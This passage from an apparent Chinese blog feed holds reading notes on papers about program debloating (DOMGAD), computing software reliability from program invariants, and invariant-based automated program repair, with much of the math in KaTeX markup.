start="2"><li>使用随机优化简化程序,以在简化和通用性(即简化程序能够正确处理整个域中输入的程度)上实现权衡</li></ol></li></ul></li><li><p>在ChiselBench上评估,50%的代码减少和95%的通用性,高于目前两种SOTA</p></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p><strong>DOMGAD</strong>两个优点</p><ul><li><ol><li>生成的简化程序保证在子域上工作,而不是输入;</li></ol><ul><li>即DomGad生成的程序对属于这些子域的每一个输入都能正确运行;</li><li>对不属于当前子域的输入都会禁止运行防止异常行为; 与此相对基于输入的方法仅能保证在特定输入下正确运行,因此阻止异常行为的唯一方法是阻止未知输入的执行</li></ul></li><li><ol start="2"><li>DOMGAD不仅考虑了简化,也考虑了在通用性上的权衡</li></ol></li></ul></li><li><p>我们的方法中,使用路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span></eq> 来符号化 程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的子域,使用符号 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">D</mi><mo stretchy="false">(</mo><mi>π</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}(\pi)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mclose">)</span></span></span></span></eq> 来指示所有属于该子域的输入.</p></li><li><p>为了正确运行子域内所有输入,DOMGAD保守地保留 运行运行路径上的代码</p></li><li><p>DOMGAD的目标是生成一个可以处理子域的简化程序,并实现简化和通用之间的权衡. 即,假设输入在程序中均匀分布,我们的方法生成尽可能小的程序同时处理子域内尽可能多的输入</p></li><li><p>为了实现这一目标,我们将简化为顶定义为一个优化为题,定义一个目标函数,量化 reduction 和 generality,并使用随机优化算法来解决它</p></li><li><p>量化通用性很难,我们提出了一种基于关键洞察的实际技术，即可以对程序域的底层输入分布进行建模并利用基于采样的方法</p><ul><li>具体来说,DOMGAD<ul><li><ol><li>从输入分布中抽取样本,来识别出一组有限的路径集合 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∏</mo></mrow><annotation encoding="application/x-tex">\prod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∏</span></span></span></span></eq> ,这些路径集合覆盖了程序域的大部分输入</li></ol></li><li><ol start="2"><li>基于导致该路径的采样输入数量,估计每个路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo>∈</mo><mo>∏</mo></mrow><annotation encoding="application/x-tex">\pi \in \prod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∏</span></span></span></span></eq> 相对应的子域大小. 尽管我们的采样方法只能计算通用性的近似值,但可以通过计算,界定解的误差. 因此通过足够的样本,我们的方法误差将会非常小</li></ol></li></ul></li></ul></li><li><p>我们总的简化过程如下</p><ul><li>输入程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> , 一个输入采样器 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">IS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> , 该采样器模拟 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 域中的输入分布 并生成输入样本,给定这些输入,DOMGAD进行三个主要步骤: (1) 路径识别 (2)路径量化 (3) 随机优化</li><li><ol><li>路径识别:DOMGAD调用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">IS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 生成输入样本,并识别出一组路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∏</mo></mrow><annotation encoding="application/x-tex">\prod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∏</span></span></span></span></eq> ,这些路径覆盖了程序域的大部分输入</li></ol></li><li><ol start="2"><li>路径量化:DOMGAD再次调用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">IS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 生成额外的样本用于估计每个路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo>∈</mo><mo>∏</mo></mrow><annotation encoding="application/x-tex">\pi \in \prod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∏</span></span></span></span></eq> 相对应的子域大小. 基于这些估计,DOMGAD计算每个生成的简化程序的通用性. 在这一步中,同时也比较 reduction 和工具面</li></ol></li><li><ol start="3"><li>随机优化:DOMGAD使用MCMC随机优化算法,来实现生成 通用性和简化之间的权衡</li></ol></li></ul></li><li><p>使用ChiselBench评估DOMGAD,与Chisel和DEBOP进行比较.</p></li><li><p>本文主要贡献如下</p><ul><li><ol><li>一个新的,基于子域的,注重通用性的简化技术DOMGAD, 使用随机优化算法来生成简化程序来达到简化和通用性之间的权衡</li></ol></li><li><ol start="2"><li>通过实验评估展示我们技术的效果,并证实了进行注重泛化的简化是可行的</li></ol></li><li><ol start="3"><li>提供了DOMGAD的原型实现,并<a href="https://sites.google.com/view/domgad/">开源</a></li></ol></li></ul></li></ul><h3 id="2-%E7%A4%BA%E4%BE%8B" tabindex="-1">2 示例</h3><h3 id="3-%E5%88%9D%E6%AD%A5%E5%AE%9A%E4%B9%89" tabindex="-1">3 初步定义</h3><h3 id="4-%E6%88%91%E4%BB%AC%E7%9A%84%E6%96%B9%E6%B3%95%3Adomgad" tabindex="-1">4 我们的方法:DOMGAD</h3><h3 id="5-%E8%AF%84%E4%BC%B0" tabindex="-1">5 评估</h3><h3 id="6-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">6 相关工作</h3><h4 id="%E7%A8%8B%E5%BA%8F%E7%AE%80%E5%8C%96" tabindex="-1">程序简化</h4><ul><li><p>DOMGAD与一系列[22,41,45,55,57] 依赖 使用配置文件的简化技术相关</p><ul><li>TRIMMER [55] 通过激进的编译器优化实现简化</li><li>OOCAM [38] 通过部分估值实现简化</li><li>C-Reduce[45],Perses[57],CHISEL[22] 是基于delta-debugging的简化技术</li><li>J-Reduce[20] 使用依赖信息来改进delta-debugging</li><li>RAZOR [41] 采用基于代码覆盖,推理,和二进制重写的简化方法</li></ul></li><li><p>与上述技术不同</p><ul><li>DOMGAD是基于子域的,而不是具体的输入</li><li>DOMGAD不是单纯的简化导向,而是在简化和通用性之间进行权衡</li></ul></li><li><p>DEBOP[61] 是我们之前提出的方法,但其是基于输入的,并且在语句级别操作,而不是路径级别.如我们结果显示,这对其简化和效率产生了影响</p></li><li><p>DomGad也和一些基于静态分析来删除死代码或未使用代码的技术相关[1, 24, 26, 27, 29, 42],以及对应特别程序(例如 容器[44] 或 web应用[3]),或特殊目的(例如安全检测[15]) 而执行简化的技术有关</p></li><li><p>更广泛地硕,DOMGAD和膨胀检测[4,62,63],识别不必要代码[21],以及通过程序切片识别感兴趣代码的技术有关[60]</p></li></ul><h4 id="%E6%A8%A1%E5%9E%8B%E8%AE%A1%E6%95%B0%E5%92%8C%E6%A6%82%E7%8E%87%E5%88%86%E6%9E%90" tabindex="-1">模型计数和概率分析</h4><ul><li>因为DOMGAD使用静态采样方法,因此其与 模型技术有关[2,7,32],这些技术旨在量化满足给定公式的模型数量</li><li>处于类似原因,其也与概率软件分析[5,16,51] 有关,这些技术旨在量化程序的概率行为</li><li>与统计模型检验技术[35]有关,该技术通过验证统计方法验证概率事件的属性</li></ul><h4 id="mcmc%E5%92%8C%E4%BC%98%E5%8C%96" tabindex="-1">MCMC和优化</h4><ul><li>DOMGAD使用基于MCMC的,以此其和使用MCMC解决其它问题的技术间接有关,如优化[52]、漏洞查找[8,33]基于模型的GUI测试[56]和程序混淆[36]。最后，DomGad与资源适应[12]、能量减少[53]、程序修复[34]以及更广泛的软件改进[40]的优化技术有松散的关联。</li></ul><h3 id="7-%E7%BB%93%E8%AE%BA%E5%92%8C%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C" tabindex="-1">7 结论和未来工作</h3><ul><li>结论<ul><li>现有基于输入的方法容易过拟合输入,且只考虑简化</li><li>我们提出了一种新的,基于子域的,注重通用性的简化技术DOMGAD, 使用随机优化算法,来生成简化程序来达到简化和通用性之间的权衡,通过一个综合这两个相互冲突度量的目标函数执行随机优化</li><li>结果显示我们的技术可以生成显著的代码减少（平均50%），同时保持高泛化性（平均95%）</li><li>与SOTA比较,DOMGAD表现良好</li></ul></li><li>未来工作<ul><li><ol><li>扩展我们的评估</li></ol><ul><li>(1) 使用 DOMGAD 应用于更广泛的程序集,来评估我们现在的结果是否具有普遍性</li><li>(2) 进行用户研究,评估现实环境中通用性的价值</li></ul></li><li><ol start="2"><li>探究提升路径识别和量化 效率的新方法</li></ol><ul><li>具体而言,将考虑 分层抽样[47],顺序抽样[58] 等方法</li><li>以及研究基于共享输入样本 ,同时执行路径识别和量化的可能性</li></ul></li><li><ol start="3"><li>考虑其它随机方法</li></ol><ul><li>例如 Gibbs Sampling[17],来改进优化结果</li></ul></li><li><ol start="4"><li>研究推断程序输入分布的方法</li></ol><ul><li>可能基于使用配置文件,自动构建输入样本生成器.为此,可以考虑基于 概率程序合成[39],概率密度估计[59],分布估计[30]和深度生成模型[43, 46]的方法。</li></ul></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于程序不变量计算软件可靠性</title>
      <link href="/2024/03/19/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%B8%8D%E5%8F%98%E9%87%8F%E8%AE%A1%E7%AE%97%E8%BD%AF%E4%BB%B6%E5%8F%AF%E9%9D%A0%E6%80%A7/"/>
      <url>/2024/03/19/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%B8%8D%E5%8F%98%E9%87%8F%E8%AE%A1%E7%AE%97%E8%BD%AF%E4%BB%B6%E5%8F%AF%E9%9D%A0%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%B8%8D%E5%8F%98%E9%87%8F%E8%AE%A1%E7%AE%97%E8%BD%AF%E4%BB%B6%E5%8F%AF%E9%9D%A0%E6%80%A7" tabindex="-1">基于程序不变量计算软件可靠性</h2><ul><li>引用：周远, 丁佐华. 基于程序不变量计算软件可靠性[J]. 软件学报, 2015, 26(12): 3075-3087.</li></ul><h3 id="0-%E4%BB%8B%E7%BB%8D" tabindex="-1">0 介绍</h3><ul><li>软件可靠性的计算依赖于可靠性模型的选取以及所获得的软件失效数据</li><li>失效数据的获取对可靠性及模型有非常大的影响[20]，因此我们必须考虑是小数据的质量和收集失效数据的方案</li><li>目前应用最广泛的针对各个开发阶段失效数据收集的方法是软件测试技术，软件测试包括 3 个要素:选择输入域、执行测试用例和比较输出[22].学者们提出了多种测试方法来获得软件失效数据[23],然而这些方法都是通过比较实际输出结果与期望输出结果得到诸如失效次数、失效用例等的失效数据,而忽略了软件的实时行为和内部结构,从而导致这些数据并不能真实反映软件的真实行为,如:<ul><li><ol><li>存在假性正确现象：即偶然正确，如软件的输出结果与期望输出结果一致,但软件的内部结构和行为并不正确</li></ol></li><li><ol start="2"><li>测试不能显示一个输入有多个错误的输出情况.</li></ol></li><li><ol start="3"><li>不同测试方法会影响到失效数据的获取比例,从而影响可靠性的计算.</li></ol><ul><li>Chen 等人[24]通过实验指出,不同的测试方法(随机测试、功能测试、分块测试)获得的失效数据会产生不同的可靠性.作者认为:这是因为这样获得的失效数据并没有真正反映程序的内部信息,仅反映了在所选测试用例下粗糙的程序的信息,所以计算出来的可靠性也是不准确的,无法反映软件真实的可靠性.</li></ul></li></ul></li><li>因此，通过测试阶段的输入/输出所获取的失效数据并不充分，无法准确反映程序内部存在的问题，为此我们需要程序的内部数据来计算软件的可靠性，一个解决方案是：<ul><li>通过观察和分析测试过程中程序的执行轨迹从中提取程序的内部信息(例如内部结构、动态行为)。这里使用Daikon工具提取不变量，从这些不好的不变量中获得不好的不变量，利用这些不好的不变量计算可靠性</li><li>在前人工作下，本文对使用不变量计算可靠性进行了可行性分析</li></ul></li><li>与现有的可靠性方法比较，两种方法差别很小，不依赖于对测试方法的选择，而进一步的方差说明：所提方法波动更小，更平稳，更接近系统的真实可靠性</li></ul><h3 id="4-%E5%A4%B1%E6%95%88%E6%95%B0%E6%8D%AE%E7%9A%84%E8%8E%B7%E5%8F%96-%E5%8F%8A-%E5%8F%AF%E8%A1%8C%E6%80%A7%E5%88%86%E6%9E%90" tabindex="-1">4 失效数据的获取  及 可行性分析</h3><ul><li>文章例子是改变程序中的数组，产生新的不变量，与原来的不变量进行比较，产生变化的不变量即失效数据</li><li>失效数据获取例子：<ul><li>我们通过 3 种不同的方法来选取测试用例集 T1(随机选取)、T2(基于分块覆盖选取)、T3(基于分支覆盖选取).</li><li>分别运行正确版本程序 C 与 T1、C 与 T2、C 与 T3 得到程序不变量 TI1,TI2 和 TI3</li><li>运行错误版本程序 F 与 T1、F 与 T2、F 与 T3 得到程序不变量 FI1,FI2 和 FI3.</li><li>比较 TI1 与 FI1、TI2 与 FI2 以及 TI3 与 FI3 的不同,分别得到各自的失效数据.</li></ul></li><li>可行性分析：<ul><li>每种方法所获得的失效数据百分比,可以发现不同方法获得的失效数据百分比基本相近,误差不大.</li><li>可以得到结论不同测试方法得到不同的不变量;但是就失效数据的百分比来说,它们之间相差较小,比较稳定.</li></ul></li></ul><h3 id="5-%E5%8F%AF%E9%9D%A0%E6%80%A7%E8%AE%A1%E7%AE%97%E5%92%8C%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90" tabindex="-1">5 可靠性计算和结果分析</h3><ul><li>可靠性计算：使用Nelson模型计算，不好的不变量作为失效数据，不同方法法算出的可靠性虽然不一样,但相差较小；使用方差刻画，基于不变量的可靠性计算结果方差较小</li><li>综上所述<ul><li>在不同测试方法下,由不变量计算出的可靠性不是完全相等,还有一定的误差,其原因是有些不好的</li><li>不变量之间还有一定的依赖性;</li></ul></li></ul><h3 id="6-%E5%8F%AF%E8%A1%8C%E6%80%A7%E5%88%86%E6%9E%90" tabindex="-1">6 可行性分析</h3><ul><li><p>用现有计算可靠性的方法计算7个程序的可靠性（Nelson模型），比较不便令计算出的可靠性和现有方法计算出的可靠性之间的差异</p><ul><li>二者在不同测试方法下差异不大</li><li>可靠性方差都不是太大;但是相比较而言,现有方法的可靠性波动远大于不变量计算出的可靠性波动<ul><li>因为现有方法计算出的可靠性一定程度上依赖于测试方法,反映软件的局部行为计算出的可靠性是在该测试方法下的可靠性，所以在不同测试方法下,可靠性会有一定的波动；而不变量是整体的行为，,虽然不同的测试方法会产生不同的不变量,但这些不变量的合成效果却是一样的,都反映软件整体的行为,所以不变量计算出的可靠性是软件的整体可靠性,其波动产生的原因在于有些失效数据(不好的不变量)之间还有一定的相关性.</li></ul></li></ul></li><li><p>综述所述:相对于现有的计算可靠性方法,我们还可以利用不变量来计算软件的可靠性;且利用不变量计算的可靠性更接近软件的实际可靠性</p></li></ul><h3 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h3><ul><li><p>本文说明可以使用程序不变量计算软件的可靠性</p><ul><li><ol><li>在同一测试方法下,不变量计算出的可靠性和现有方法计算出的可靠性相差不大</li></ol></li><li><ol start="2"><li>在不同测试方法下,不变量计算出的可靠性波动较小,更接近软件的实际可靠性.</li></ol></li><li><ol start="3"><li>从不变量的角度来刻画软件可靠性,使我们对软件的整体行为和软件可靠性有更深刻的认识,有利于软件可靠性的评估和预测.</li></ol></li></ul></li><li><p>未来工作：</p><ul><li><ol><li>针对不变量中的相关性：如果不好的不变量之间存在相关性,会增加失效数据,影响计算结果.我们应尽量去掉这种相关性,使得剩下的不变量尽可能独立.一种办法是建立数据流的依赖图</li></ol></li><li><ol start="2"><li>在实际应用中,我们并不知道正确的程序,这样我们就不能通过比较来获得不好的不变量,而必须通过一定的方法,根据已有的测试用例信息和已获得的不变量信息来确定不好的不变量,这将是我们接下来要解决的关键问题之一.</li></ol></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不变量与程序修复相关论文</title>
      <link href="/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%B8%8D%E5%8F%98%E9%87%8F%E4%B8%8E%E7%A8%8B%E5%BA%8F%E4%BF%AE%E5%A4%8D%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/"/>
      <url>/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%B8%8D%E5%8F%98%E9%87%8F%E4%B8%8E%E7%A8%8B%E5%BA%8F%E4%BF%AE%E5%A4%8D%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h2 id="%E2%85%B0-invariant-based-program-repair" tabindex="-1">Ⅰ Invariant-based Program Repair</h2><ul><li>引用：Al-Bataineh O I. Invariant-based Program Repair[J]. arXiv preprint arXiv:2312.16652, 2023.</li></ul><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li><p>本论文描述了一种 基于程序中ivariants概念的正式通用的自动化程序修复框架。</p></li><li><p>在上述框架中，动态分析缺陷程序的运行踪迹，推断出特征 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 表示可能不变量（良好模式）的集合，这些不变量是运行成功所需的，而 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 表示可能可疑不变量（错误模式），导致瑕疵程序中的错误。</p></li><li><p>随后，利用严格的程序分析技术来对这些规范进行精炼，这些技术还可以引导修复过程生成可用补丁，随后评估这些补丁的正确性</p></li><li><p>通过开发一种基于invariants的高效修复bug的修复系统，我们展示了使用invariants在APR中的实用性</p></li><li><p>初步分析证明，基于不变量的APR在处理bug的性能方面是有效的，能够生成 确保程序效率提升且不对其功能产生不利影响的补丁</p></li><li><p><strong>KeyWord</strong>：</p><ul><li>Automated program repair</li><li>Invariant learning and refinement</li><li>Patch overfitting</li><li>Program verifier</li><li>CPAChecker</li><li>Performance bug</li></ul></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li>Automated program repair (APR) 最近引起了很大的关注，其通过自动生成 瑕疵程序的补丁来显著减少手动调试工作。 现代化的修复工具已经被证明在修复许多实际程序中的错误方面是有效的.然而自动生成的补丁质量不佳[11]，仍然是软件从业者采用自动化程序修复的主要障碍</li></ul><h4 id="%E9%97%AE%E9%A2%98" tabindex="-1">问题</h4><p>当前APR工具自动生成的补丁质量较低的主要原因是缺乏预期行为的规范。大多数程序修复系统依赖于测试行为作为正确性标准，因为软件开发者没有明确提供正式规范。因此，当前的APR方法产生的补丁可能是合理的，但仍然在部署前进行手动检查。因此，目前无法保证生成的补丁通常是正确的，并且不会引入新的错误。</p><h4 id="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95" tabindex="-1">解决方法</h4><ul><li>程序验证技术使开发人员能够在部署之前证明程序的正确性。<ul><li>支持这项技术的关键之一是推断程序invarant,一个作为程序的抽象规范的逻辑表示。开发人员可以通过程序不变量显著受益，以确定修改代码必须要保留的程序属性。</li><li>不幸的是，这些invariants通常在代码中确实，导致了不严格的APR方法（如动态APR）占据主导地位；以及众所周知的补丁过拟合问题</li></ul></li><li>我们认为，通过使用测试用例和基于可达性的分析技术，可以获得准确的invarants集合，用于生成高质量的补丁，即 CPAChecker<br>[3] and PathFinder [15]之类的程序验证工具可用于优化生成invariants的过程<ul><li>首先，我们使用测试用例来分析程序的运行轨迹推断invariant集合，随后，使用程序验证器对这些候选就行优化以获得更准确的invariants。目标是推断出两个规范<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 表示成功运行需要的良好模式集合</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" 